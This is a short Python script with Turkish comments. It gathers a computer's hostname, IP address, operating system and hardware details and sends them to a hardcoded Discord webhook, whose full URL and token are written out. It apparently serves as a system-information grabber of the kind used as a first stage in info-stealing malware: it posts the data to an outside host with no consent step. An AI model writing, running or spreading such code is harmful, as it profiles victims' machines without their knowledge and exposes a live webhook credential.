import requests
import platform
import socket

# Webhook URL'nizi buraya yapıştırın
WEBHOOK_URL = "https://discord.com/api/webhooks/1273572307830575165/hnMv3FFN-gsvl-bQm66S04WFj7s8Pxdbll_T2sctvkG17obJkZ7MY60J_6PfTVZZ6fVH"

# Bilgisayar bilgilerini toplayın
def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    node = platform.node()
    machine = platform.machine()
    processor = platform.processor()
    
    return {
        "IP Address": ip_address,
        "System": system,
        "Node": node,
        "Machine": machine,
        "Processor": processor
    }

# Webhook'a bilgi gönderin
def send_to_discord(info):
    message = {
        "content": f"**PC Bilgileri:**\n\n"
                   f"**IP Adresi:** {info['IP Address']}\n"
                   f"**Sistem:** {info['System']}\n"
                   f"**Düğüm (Node):** {info['Node']}\n"
                   f"**Makine:** {info['Machine']}\n"
                   f"**İşlemci:** {info['Processor']}"
    }
    
    response = requests.post(WEBHOOK_URL, json=message)
    
    if response.status_code == 204:
        print("Mesaj başarıyla gönderildi.")
    else:
        print(f"Mesaj gönderilirken bir hata oluştu: {response.status_code} - {response.text}")

if __name__ == "__main__":
    system_info = get_system_info()
    send_to_discord(system_info)
